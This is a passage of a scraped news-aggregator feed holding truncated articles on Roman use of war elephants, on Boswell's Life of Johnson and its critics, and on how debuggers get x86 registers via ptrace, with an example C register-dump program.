<figure><img data-attachment-id="639" data-permalink="https://acoup.blog/300-elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" data-orig-size="1353,806" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="300-elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" alt=""><figcaption>From 300.  I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>



<figure><img data-attachment-id="640" data-permalink="https://acoup.blog/g3446/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" data-orig-size="1186,1172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g3446" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" alt=""><figcaption>Roman denarius (a coin) issued by Julius Caesar to commemorate the Battle of Thapsus (46 B.C.)</figcaption></figure>



<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>



<figure><img data-attachment-id="642" data-permalink="https://acoup.blog/1280px-sumatran_elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" data-orig-size="1280,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1280px-sumatran_elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" alt=""><figcaption>Asian Elephant eating, via <a href="https://commons.wikimedia.org/wiki/Category:Elephas_maximus#/media/File:Sumatran_elephants.jpg">Wikimedia Commons</a>.  They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870626</guid>
            <pubDate>Fri, 23 Oct 2020 15:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boswell's Life of Johnson]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24870552">thread link</a>) | @benbreen
<br/>
October 23, 2020 | https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/# | <a href="https://web.archive.org/web/*/https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</a></em></p>]]>
            </description>
            <link>https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870552</guid>
            <pubDate>Fri, 23 Oct 2020 15:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Debuggers Work: Getting and Setting x86 Registers]]>
            </title>
            <description>
<![CDATA[
Score 132 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24870497">thread link</a>) | @tosh
<br/>
October 23, 2020 | https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<p>(<a href="https://github.com/Moritz-Systems/how-debuggers-work-registers-part-1/blob/master/dump-gpr.c">standalone example source</a>,
 <a href="#the-gpr-ptrace-2-api">skip listing</a>)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

enum {
    R_RAX, R_RBX, R_RCX, R_RDX, R_RSI, R_RDI, R_RBP, R_RSP,
    R_R8, R_R9, R_R10, R_R11, R_R12, R_R13, R_R14, R_R15,
    R_RIP, R_RFLAGS,
    R_LENGTH
};

enum {
    S_CS, S_DS, S_ES, S_FS, S_GS, S_SS,
    S_LENGTH
};

int main()
{
    uint64_t gpr[R_LENGTH];
    uint16_t seg[S_LENGTH];

    asm volatile (
        /* fill registers with random data */
        "mov $0x0102030405060708, %%rax\n\t"
        "mov $0x1112131415161718, %%rbx\n\t"
        "mov $0x2122232425262728, %%rcx\n\t"
        "mov $0x3132333435363738, %%rdx\n\t"
        "mov $0x4142434445464748, %%rsi\n\t"
        "mov $0x5152535455565758, %%rdi\n\t"
        /* RBP is used for frame pointer, RSP is stack pointer */
        "mov $0x8182838485868788, %%r8\n\t"
        "mov $0x9192939495969798, %%r9\n\t"
        "mov $0xa1a2a3a4a5a6a7a8, %%r10\n\t"
        "mov $0xb1b2b3b4b5b6b7b8, %%r11\n\t"
        "mov $0xc1c2c3c4c5c6c7c8, %%r12\n\t"
        "mov $0xd1d2d3d4d5d6d7d8, %%r13\n\t"
        "mov $0xe1e2e3e4e5e6e7e8, %%r14\n\t"
        "mov $0xf1f2f3f4f5f6f7f8, %%r15\n\t"

        /* dump GPRs */
        "mov %%rax, %[rax]\n\t"
        "mov %%rbx, %[rbx]\n\t"
        "mov %%rcx, %[rcx]\n\t"
        "mov %%rdx, %[rdx]\n\t"
        "mov %%rsi, %[rsi]\n\t"
        "mov %%rdi, %[rdi]\n\t"
        "mov %%rbp, %[rbp]\n\t"
        "mov %%rsp, %[rsp]\n\t"
        "mov %%r8, %[r8]\n\t"
        "mov %%r9, %[r9]\n\t"
        "mov %%r10, %[r10]\n\t"
        "mov %%r11, %[r11]\n\t"
        "mov %%r12, %[r12]\n\t"
        "mov %%r13, %[r13]\n\t"
        "mov %%r14, %[r14]\n\t"
        "mov %%r15, %[r15]\n\t"
        /* dump RIP */
        "lea (%%rip), %%rbx\n\t"
        "mov %%rbx, %[rip]\n\t"
        "mov %[rbx], %%rbx\n\t"
        /* dump segment registers */
        "mov %%cs, %[cs]\n\t"
        "mov %%ds, %[ds]\n\t"
        "mov %%es, %[es]\n\t"
        "mov %%fs, %[fs]\n\t"
        "mov %%gs, %[gs]\n\t"
        "mov %%ss, %[ss]\n\t"
        /* dump RFLAGS */
        "pushfq\n\t"
        "popq %[rflags]\n\t"

        : [rax] "=m"(gpr[R_RAX]), [rbx] "=m"(gpr[R_RBX]),
          [rcx] "=m"(gpr[R_RCX]), [rdx] "=m"(gpr[R_RDX]),
          [rsi] "=m"(gpr[R_RSI]), [rdi] "=m"(gpr[R_RDI]),
          [rbp] "=m"(gpr[R_RBP]), [rsp] "=m"(gpr[R_RSP]),
           [r8] "=m"(gpr[ R_R8]), [ r9] "=m"(gpr[ R_R9]),
          [r10] "=m"(gpr[R_R10]), [r11] "=m"(gpr[R_R11]),
          [r12] "=m"(gpr[R_R12]), [r13] "=m"(gpr[R_R13]),
          [r14] "=m"(gpr[R_R14]), [r15] "=m"(gpr[R_R15]),
          [rip] "=m"(gpr[R_RIP]), [rflags] "=m"(gpr[R_RFLAGS]),
          [cs] "=m"(seg[S_CS]), [ds] "=m"(seg[S_DS]),
          [es] "=m"(seg[S_ES]), [fs] "=m"(seg[S_FS]),
          [gs] "=m"(seg[S_GS]), [ss] "=m"(seg[S_SS])
        :
        : "%rax", "%rbx", "%rcx", "%rdx", "%rsi", "%rdi",
          "%r8", "%r9", "%r10", "%r11", "%r12", "%r13", "%r14", "%r15",
          "memory"
    );

    printf("rax = 0x%016lx\n", gpr[R_RAX]);
    printf("rbx = 0x%016lx\n", gpr[R_RBX]);
    printf("rcx = 0x%016lx\n", gpr[R_RCX]);
    printf("rdx = 0x%016lx\n", gpr[R_RDX]);
    printf("rsi = 0x%016lx\n", gpr[R_RSI]);
    printf("rdi = 0x%016lx\n", gpr[R_RDI]);
    printf("rbp = 0x%016lx\n", gpr[R_RBP]);
    printf("rsp = 0x%016lx\n", gpr[R_RSP]);
    printf(" r8 = 0x%016lx\n", gpr[R_R8]);
    printf(" r9 = 0x%016lx\n", gpr[R_R9]);
    printf("r10 = 0x%016lx\n", gpr[R_R10]);
    printf("r11 = 0x%016lx\n", gpr[R_R11]);
    printf("r12 = 0x%016lx\n", gpr[R_R12]);
    printf("r13 = 0x%016lx\n", gpr[R_R13]);
    printf("r14 = 0x%016lx\n", gpr[R_R14]);
    printf("r15 = 0x%016lx\n", gpr[R_R15]);
    printf("rip = 0x%016lx\n", gpr[R_RIP]);
    printf("cs = 0x%04x\n", seg[S_CS]);
    printf("ds = 0x%04x\n", seg[S_DS]);
    printf("es = 0x%04x\n", seg[S_ES]);
    printf("fs = 0x%04x\n", seg[S_FS]);
    printf("gs = 0x%04x\n", seg[S_GS]);
    printf("ss = 0x%04x\n", seg[S_SS]);
    printf("rflags = 0x%016lx\n", gpr[R_RFLAGS]);

    return 0;
}
</code></pre>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<p>(<a href="https://github.com/freebsd/freebsd/blob/master/sys/x86/include/reg.h#L99">FreeBSD structs</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/i386/include/reg.h#L70">NetBSD/i386 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/reg.h#L45">NetBSD/amd64 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/frame_regs.h#L6">NetBSD/amd64 register names</a>,
 <a href="#floating-point-registers">skip listing</a>)</p>

<pre><code>/* FreeBSD/i386 */               /* NetBSD/i386 */

struct __reg32 {                 struct reg {
    __uint32_t  r_fs;               int r_eax;
    __uint32_t  r_es;               int r_ecx;
    __uint32_t  r_ds;               int r_edx;
    __uint32_t  r_edi;              int r_ebx;
    __uint32_t  r_esi;              int r_esp;
    __uint32_t  r_ebp;              int r_ebp;
    __uint32_t  r_isp;              int r_esi;
    __uint32_t  r_ebx;              int r_edi;
    __uint32_t  r_edx;              int r_eip;
    __uint32_t  r_ecx;              int r_eflags;
    __uint32_t  r_eax;              int r_cs;
    __uint32_t  r_trapno;           int r_ss;
    __uint32_t  r_err;              int r_ds;
    __uint32_t  r_eip;              int r_es;
    __uint32_t  r_cs;               int r_fs;
    __uint32_t  r_eflags;           int r_gs;
    __uint32_t  r_esp;           };
    __uint32_t  r_ss;
    __uint32_t  r_gs;
};


/* FreeBSD/amd64 */              /* NetBSD/amd64 */

struct __reg64 {                 #define _FRAME_REG(greg, freg) \
    __int64_t   r_r15;               greg(rdi, RDI, 0) \
